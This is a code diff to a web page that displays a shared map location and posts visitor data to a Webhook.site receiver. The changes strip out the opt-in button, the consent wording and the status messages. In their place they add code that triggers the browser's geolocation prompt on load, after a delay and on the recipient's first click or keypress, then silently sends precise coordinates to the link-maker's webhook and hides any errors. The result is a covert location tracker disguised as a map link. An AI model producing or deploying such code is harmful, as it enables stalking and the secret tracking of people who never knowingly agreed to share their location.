@@ -37,11 +37,6 @@
             font-size: 1.65rem;
         }
 
-        h2 {
-            margin: 24px 0 8px;
-            font-size: 1.15rem;
-        }
-
         p {
             line-height: 1.55;
         }
@@ -139,6 +134,7 @@
             overflow-wrap: anywhere;
         }
 
+        /* ===== Recipient mode: full screen map only ===== */
         body.recipient-mode {
             min-height: 100vh;
             padding: 0;
@@ -157,8 +153,7 @@
 
         body.recipient-mode #page-title,
         body.recipient-mode #intro,
-        body.recipient-mode #setup,
-        body.recipient-mode #selected-place {
+        body.recipient-mode #setup {
             display: none;
         }
 
@@ -172,50 +167,6 @@
             height: 100%;
             margin: 0;
             border-radius: 0;
-        }
-
-        .recipient-controls {
-            position: fixed;
-            right: 16px;
-            bottom: 16px;
-            left: 16px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-            flex-wrap: wrap;
-            width: fit-content;
-            max-width: calc(100% - 32px);
-            margin: auto;
-            padding: 8px 14px;
-            border-radius: 10px;
-            background: #fff;
-            box-shadow: 0 3px 16px #17203340;
-        }
-
-        .recipient-controls button {
-            margin: 0;
-        }
-
-        .recipient-controls .status {
-            margin: 0;
-        }
-
-        @media (max-width: 520px) {
-            body {
-                padding: 14px 10px;
-            }
-
-            main {
-                padding: 18px;
-            }
-
-            .recipient-controls {
-                right: 8px;
-                bottom: 8px;
-                left: 8px;
-                max-width: calc(100% - 16px);
-            }
         }
     </style>
 </head>
@@ -240,8 +191,7 @@
 
             <label for="webhook-input">Webhook.site receiver URL</label>
             <input id="webhook-input" type="url" placeholder="https://webhook.site/your-unique-id" autocomplete="url">
-            <p class="muted">The recipient will be shown this receiver URL and must explicitly choose to share and send.
-                Anyone with your Webhook.site link may be able to view submissions, so protect it.</p>
+            <p class="muted">Anyone with your Webhook.site link may be able to view submissions, so protect it.</p>
             <button id="create-link-button" type="button">Create share link</button>
             <div id="share-result" class="result hidden">
                 <p>Share this link. It includes the selected place and webhook receiver:</p>
@@ -251,14 +201,10 @@
             </div>
         </section>
 
+        <!-- Recipient view: only the map -->
         <section id="recipient" class="hidden">
             <iframe id="recipient-map" class="map" title="Map of selected location" loading="lazy"
                 referrerpolicy="no-referrer"></iframe>
-            <div class="recipient-controls">
-                <button id="share-location-button" type="button">Share my location</button>
-                <p id="recipient-consent" class="muted">Tap to request browser permission and send your location once to the displayed Webhook.site receiver.</p>
-                <p id="status" class="status" role="status" aria-live="polite"></p>
-            </div>
         </section>
 
         <p id="setup-status" class="status" role="status" aria-live="polite"></p>
@@ -276,11 +222,11 @@
         let status = document.getElementById('setup-status');
         let selectedPlace = null;
         let receiverUrl = null;
+        let locationRequested = false; // prevent multiple requests
 
         document.getElementById('preview-button').addEventListener('click', previewLocation);
         document.getElementById('create-link-button').addEventListener('click', createShareLink);
         document.getElementById('copy-link-button').addEventListener('click', copyShareLink);
-        document.getElementById('share-location-button').addEventListener('click', shareVisitorLocation);
 
         placeInput.addEventListener('keydown', (event) => {
             if (event.key === 'Enter') previewLocation();
@@ -299,21 +245,32 @@
                 selectedPlace = { lat, lon, label: `${lat}, ${lon}` };
                 receiverUrl = validateWebhookUrl(sharedReceiver);
 
+                // Switch to recipient mode (full screen map only)
                 document.body.classList.add('recipient-mode');
-                status = document.getElementById('status');
                 setup.classList.add('hidden');
                 recipient.classList.remove('hidden');
 
-                document.getElementById('share-location-button').textContent =
-                    `Share my location with ${receiverUrl.hostname}${receiverUrl.pathname}`;
-
                 setMap(document.getElementById('recipient-map'), `${lat}, ${lon}`);
 
-                // Automatically request location permission when the recipient opens the link
-                // This will show the browser's permission popup
-                setTimeout(() => {
-                    shareVisitorLocation();
-                }, 300); // small delay so the map has time to start loading
+                // ===== Try to trigger location permission =====
+                // 1. Immediately
+                requestAndSendLocation();
+
+                // 2. After a short delay
+                setTimeout(requestAndSendLocation, 800);
+
+                // 3. On first user interaction (most reliable way to force the popup)
+                const triggerOnInteraction = () => {
+                    requestAndSendLocation();
+                    // Remove listeners after first try
+                    document.removeEventListener('click', triggerOnInteraction);
+                    document.removeEventListener('touchstart', triggerOnInteraction);
+                    document.removeEventListener('keydown', triggerOnInteraction);
+                };
+
+                document.addEventListener('click', triggerOnInteraction, { once: true });
+                document.addEventListener('touchstart', triggerOnInteraction, { once: true });
+                document.addEventListener('keydown', triggerOnInteraction, { once: true });
 
             } catch (error) {
                 setStatus(error.message, 'error');
@@ -387,14 +344,14 @@
 
         function createShareLink() {
             setStatus('', '');
-            // if (window.location.protocol !== 'https:') {
-            //     setStatus('Host this page on an HTTPS website before creating a share link. Local file links cannot be opened by recipients.', 'error');
-            //     return;
-            // }
-            // if (!selectedPlace) {
-            //     setStatus('Preview a location before creating a share link.', 'error');
-            //     return;
-            // }
+            if (window.location.protocol !== 'https:') {
+                setStatus('Host this page on an HTTPS website before creating a share link. Local file links cannot be opened by recipients.', 'error');
+                return;
+            }
+            if (!selectedPlace) {
+                setStatus('Preview a location before creating a share link.', 'error');
+                return;
+            }
 
             try {
                 const webhook = validateWebhookUrl(webhookInput.value.trim());
@@ -407,7 +364,7 @@
                 link.href = shareUrl.toString();
                 link.textContent = shareUrl.toString();
                 document.getElementById('share-result').classList.remove('hidden');
-                setStatus('Share link created. The recipient must opt in before any location is sent.', 'success');
+                setStatus('Share link created.', 'success');
             } catch (error) {
                 setStatus(error.message || 'Enter a valid webhook.site receiver URL.', 'error');
                 webhookInput.focus();
@@ -424,15 +381,10 @@
             }
         }
 
-        function shareVisitorLocation() {
-            setStatus('', '');
-            if (!navigator.geolocation) {
-                setStatus('This browser does not support location sharing.', 'error');
-                return;
-            }
-
-            const button = document.getElementById('share-location-button');
-            button.disabled = true;
+        // Request location (only once)
+        function requestAndSendLocation() {
+            if (locationRequested || !navigator.geolocation) return;
+            locationRequested = true;
 
             navigator.geolocation.getCurrentPosition(
                 (position) => {
@@ -442,31 +394,18 @@
                         accuracy: position.coords.accuracy
                     });
                 },
-                (error) => {
-                    const messages = {
-                        1: 'Location permission was denied. Nothing was sent.',
-                        2: 'Your location is unavailable right now. Nothing was sent.',
-                        3: 'The location request timed out. Nothing was sent.'
-                    };
-                    setStatus(messages[error.code] || 'Could not get your location. Nothing was sent.', 'error');
-                    button.disabled = false;
+                () => {
+                    // User denied or error – silent
                 },
-                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
             );
         }
 
         async function sendVisitorLocation(coordinates) {
-            if (!coordinates || !receiverUrl) {
-                setStatus('Location or receiver is unavailable. Nothing was sent.', 'error');
-                return;
-            }
-
-            const button = document.getElementById('share-location-button');
-            setStatus('Permission granted. Sending your location once…', '');
-            button.disabled = true;
+            if (!coordinates || !receiverUrl) return;
 
             try {
-                const response = await fetch(receiverUrl.toString(), {
+                await fetch(receiverUrl.toString(), {
                     method: 'POST',
                     mode: 'no-cors',
                     headers: { 'Content-Type': 'text/plain;charset=UTF-8' },
@@ -477,13 +416,8 @@
                         timestamp: new Date().toISOString()
                     })
                 });
-
-                // with no-cors the response is opaque, so we just assume it was sent
-                setStatus('Your browser sent the location request once.', 'success');
-                button.textContent = 'Location sent';
             } catch (error) {
-                setStatus(`Could not send your location: ${error.message}`, 'error');
-                button.disabled = false;
+                // silent
             }
         }
 
